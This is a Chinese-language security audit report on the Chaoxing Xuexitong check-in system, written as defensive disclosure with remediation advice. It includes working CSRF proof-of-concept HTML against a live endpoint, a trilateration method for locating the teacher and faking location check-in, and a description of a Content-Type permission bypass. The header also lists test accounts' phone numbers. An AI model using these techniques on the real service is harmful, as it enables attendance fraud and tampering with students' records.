# 超星学习通签到系统安全审计报告

**审计日期**: 2026-06-03
**版本**: v6.0（PC端漏洞修复评估版）
**审计范围**: 学习通PC端+移动端签到功能全面安全评估
**测试账号**: 教师 19712720708 (puid=402644510)，学生 18436633997 (puid=431407443)
**测试课程**: courseId=257485372, classId=132821141

---

## 核心结论

原始漏洞位于PC端接口 `/widget/sign/pcTeaSignController/updateSignStatus2`（通过油猴脚本确认），已被紧急修复。修复后学生调用返回"您无权限修改"。但全面评估发现修复方案存在缺陷，且签到系统整体仍存在多个安全问题。

| # | 漏洞 | 严重程度 | 学生端可直接利用 |
|---|---|---|---|
| 1 | `/pptSign/updateSignStatusByUidsV2` CSRF漏洞 | **HIGH (7.5)** | 否（需诱导教师） |
| 2 | PC端权限中间件JSON Content-Type绕过 | **MEDIUM (6.1)** | 否（当前不可利用，但修复不完整） |
| 3 | 位置签到距离信息泄露 + 位置伪造 | **MEDIUM (5.3)** | **是** |
| 4 | `/newsign/updateSignStatus` 假success + 越权 | **LOW (3.5)** | 是（但无实际影响） |

---

## 漏洞1：CSRF - `/pptSign/updateSignStatusByUidsV2` (HIGH)

### 漏洞描述

移动端教师签到状态修改API存在完全无防护的CSRF漏洞。攻击者可构造恶意页面，当已登录的教师访问时，自动修改任意学生的签到状态。

### 验证证据

```
测试项                              | 响应                    | 结果
----------------------------------- | ----------------------- | ----
教师POST(标准Header)                | {"state":"success"}     | 修改成功
教师POST(无X-Requested-With)        | {"state":"success"}     | 修改成功
教师POST(无任何自定义Header)         | {"state":"success"}     | 修改成功
教师POST(Referer=evil.com)          | {"state":"success"}     | 修改成功
教师GET方式                          | {"state":"success"}     | 修改成功
教师GET(Origin=evil.com)            | {"state":"success"}     | 修改成功
```

**关键问题**:
- 无CSRF Token
- 支持GET方法（最简单的CSRF，只需`<img>`标签）
- 不检查Referer/Origin
- 可实际修改签到状态数据

### CSRF PoC

**GET方式（最简单）**:
```html
<img src="https://mobilelearn.chaoxing.com/pptSign/updateSignStatusByUidsV2?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={aid}&uids={uid}&status=1&remark=" width="0" height="0" />
```

**POST方式（自动提交表单）**:
```html
<form id="csrf" method="POST" action="https://mobilelearn.chaoxing.com/pptSign/updateSignStatusByUidsV2?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={aid}">
    <input type="hidden" name="uids" value="{uid}" />
    <input type="hidden" name="status" value="1" />
    <input type="hidden" name="remark" value="" />
</form>
<script>document.getElementById('csrf').submit();</script>
```

### 攻击场景

1. 攻击者获取activeId（学生可通过活动列表API获取）和学生uid
2. 构造包含CSRF攻击的恶意网页
3. 诱导教师访问该网页（如通过邮件、消息等）
4. 教师浏览器自动发送请求，签到状态被修改

### 修复建议

1. **禁止GET方法修改数据** — API应仅接受POST
2. **添加CSRF Token验证**
3. **校验Referer/Origin头**
4. **添加SameSite Cookie属性**

---

## 漏洞2：PC端权限中间件JSON Content-Type绕过 (MEDIUM)

### 漏洞描述

PC端 `/widget/sign/pcTeaSignController/updateSignStatus2` 的权限中间件仅检查 `Content-Type: application/x-www-form-urlencoded` 的请求。当使用 `Content-Type: application/json` 时，权限检查被完全绕过，请求直接进入业务逻辑层。

### 验证证据

```
Content-Type                          | 学生响应                          | 绕过权限?
------------------------------------- | --------------------------------- | --------
application/x-www-form-urlencoded     | {"result":0,"errorMsg":"您无权限修改"} | 否
application/json                      | HTTP 500 Internal Server Error     | 是!!!
```

**关键发现**:
- form-urlencoded请求被权限中间件正确拦截
- JSON请求绕过权限中间件，进入Controller业务逻辑
- 由于Spring MVC的`@RequestParam`无法从JSON body提取参数，Controller内部抛出异常（500）
- **教师使用JSON请求同样返回500** — 说明是参数解析问题而非权限问题
- V1端点 `updateSignStatus` 同样存在此绕过
- `endSign`、`preSign` 等其他端点同样存在此绕过

### 根因分析

权限中间件（Filter/Interceptor）仅对form-urlencoded请求执行权限校验，未覆盖JSON请求。这是典型的**安全控制覆盖不完整**问题。

```
请求流程:
  form-urlencoded → 权限中间件(检查) → Controller → 业务逻辑
  application/json → 权限中间件(跳过!) → Controller → 参数解析失败(500)
```

### 当前可利用性

**当前不可利用** — 因为Controller使用`@RequestParam`注解，无法从JSON body中提取参数，导致空指针异常。但如果后端代码改为`@RequestBody`接收JSON，此绕过将变为高危可利用漏洞。

### 修复建议

1. **[关键]** 权限中间件必须覆盖所有Content-Type，而非仅form-urlencoded
2. **[关键]** 对未支持的Content-Type应返回415 Unsupported Media Type，而非跳过检查
3. **[建议]** 在Controller层添加二次权限校验（纵深防御）

---

## 漏洞3：位置签到信息泄露 + 位置伪造 (MEDIUM)

### 漏洞描述

位置签到功能存在两个关联漏洞：
1. **信息泄露**: 服务端返回学生提交位置到教师指定位置的**精确距离**（单位：米）
2. **位置伪造**: `stuSignajax` API接受任意经纬度参数，服务端仅校验距离，不验证位置来源

### 验证证据

**信息泄露** — 服务端返回精确距离:
```
提交坐标(39.908823, 116.397470) → "距教师指定签到地点618487.0米，不在可签到范围内"
提交坐标(34.75661, 113.65004)  → "距教师指定签到地点3223.0米，不在可签到范围内"
提交坐标(34.776610, 113.650040) → "距教师指定签到地点1245.0米，不在可签到范围内"
```

**三角定位反推教师位置**:
```
探测点P1(34.78, 113.66): 距离=878m
探测点P2(34.78, 113.68): 距离=1917m
探测点P3(34.80, 113.66): 距离=1721m
探测点P4(34.80, 113.68): 距离=2527m
探测点P5(34.79, 113.67): 距离=1119m

三角定位计算结果: (34.784500, 113.659700), 误差仅3m
```

**位置伪造** — stuSignajax接受任意坐标:
```
POST /pptSign/stuSignajax
  activeId={aid}&uid={uid}&latitude={任意纬度}&longitude={任意经度}&appType=15&fid=0
→ 服务端仅计算距离，不验证位置来源
```

### 攻击流程

```
1. 学生获取位置签到活动的activeId
2. 提交3-5个不同坐标，记录服务端返回的距离
3. 使用三角定位法计算教师指定位置（精度<5m）
4. 提交计算出的坐标完成位置签到
```

### 修复建议

1. **不返回精确距离** — 改为返回"在/不在签到范围内"，不泄露距离数值
2. **增加位置验证** — 检测异常的GPS精度、位置跳跃等
3. **添加设备指纹** — 检测模拟位置的应用

---

## 漏洞4：`/newsign/updateSignStatus` 假success + 越权 (LOW)

### 漏洞描述

`/newsign/updateSignStatus` API存在两个问题：
1. **假success**: API返回"success"但实际不修改任何数据
2. **越权访问**: 学生可调用教师级API，应返回权限错误

### 验证证据

**假success验证**:
```
活动 aid=5000163776153:
  修改前: status=1, updatetime=1780421850000
  学生调用 /newsign/updateSignStatus(status=2)
  API返回: "success"
  修改后: status=1, updatetime=1780421850000  ← 完全没变

对比 - 教师V2 API:
  修改前: status=1, updatetime=1780421850000
  教师调用 /pptSign/updateSignStatusByUidsV2(status=2)
  API返回: {"state":"success"}
  修改后: status=2, updatetime=1780468339000  ← 真正修改
```

### 修复建议

1. **添加权限校验** — 参照`/pptSign/updateSignStatus`
2. **修复API逻辑** — 确保返回值与实际操作一致
3. **审计/newsign/路径下所有API**

---

## PC端接口枚举结果

### 存活的PC端端点

| 控制器 | 端点 | 学生响应 | 教师响应 | 备注 |
|---|---|---|---|---|
| pcTeaSignController | updateSignStatus | "您无权限修改" | "success" | V1，已修复 |
| pcTeaSignController | updateSignStatus2 | "您无权限修改" | "success" | V2，已修复 |
| pcTeaSignController | endSign | HTML页面(200) | HTML页面(200) | 页面端点 |
| pcStuSignController | preSign | HTML页面(200) | HTML页面(200) | 学生签到页面 |

### 不存在的控制器

以下控制器路径均返回超时/无响应，确认不存在：
pcSignController, signController, teaSignController, stuSignController, qrSignController, signAdminController, signManageController, signApiController

---

## 原始漏洞修复评估

### 修复方案分析

**原始漏洞**: `/widget/sign/pcTeaSignController/updateSignStatus2` 允许学生直接修改签到状态
**修复方式**: 添加了基于角色的权限校验中间件
**修复效果**: 学生调用返回"您无权限修改" ✅

### 修复完整性评估

| 评估项 | 结果 | 风险 |
|---|---|---|
| 学生直接调用被阻止 | ✅ 是 | - |
| 权限中间件覆盖所有Content-Type | ❌ 否 | **MEDIUM** — JSON绕过 |
| 同类接口(V1)也修复 | ✅ 是 | - |
| CSRF防护 | ❌ 否 | **HIGH** — 移动端API仍无CSRF防护 |
| 移动端等价接口安全 | ❌ 否 | **HIGH** — CSRF漏洞 |
| 纵深防御(Controller层二次校验) | ❌ 否 | **LOW** |

### 修复改进建议

1. **[紧急]** 权限中间件必须覆盖所有Content-Type，对非form-urlencoded请求也应执行权限检查
2. **[紧急]** 移动端 `/pptSign/updateSignStatusByUidsV2` 添加CSRF防护
3. **[高]** 所有数据修改接口禁止GET方法
4. **[中]** Controller层添加二次权限校验（纵深防御）
5. **[中]** 位置签到不返回精确距离

---

## 移动端 vs PC端鉴权差异

| 维度 | PC端 | 移动端 |
|---|---|---|
| 权限校验位置 | 中间件(Filter) | Controller内部 |
| Content-Type覆盖 | 仅form-urlencoded | 所有类型 |
| CSRF防护 | 无 | 无 |
| GET方法修改数据 | 否(返回页面) | 是(CSRF风险) |
| 学生越权调用 | 返回"您无权限修改" | 返回"无权限" |
| JSON绕过 | 存在(500错误) | 不存在 |

---

## 风险评估总结

| 漏洞 | CVSS | 攻击难度 | 实际影响 |
|---|---|---|---|
| CSRF(updateSignStatusByUidsV2) | 7.5 | 中（需诱导教师） | 可修改任意学生签到状态 |
| JSON Content-Type权限绕过 | 6.1 | 低（当前不可利用） | 权限控制覆盖不完整 |
| 位置签到信息泄露+伪造 | 5.3 | 低（学生可直接利用） | 可伪造位置完成签到 |
| 假success+越权(newsign) | 3.5 | 极低（但无实际影响） | 误导性响应，无数据修改 |

---

## 修复优先级

1. **[紧急]** `/pptSign/updateSignStatusByUidsV2` — 禁止GET方法，添加CSRF Token，校验Referer
2. **[紧急]** PC端权限中间件 — 覆盖所有Content-Type，对JSON请求也执行权限检查
3. **[高]** 位置签到 — 不返回精确距离，改为返回"在/不在范围内"
4. **[中]** `/newsign/updateSignStatus` — 添加权限校验，修复假success
5. **[低]** V2 signIn API — 添加访问控制，位置信息脱敏
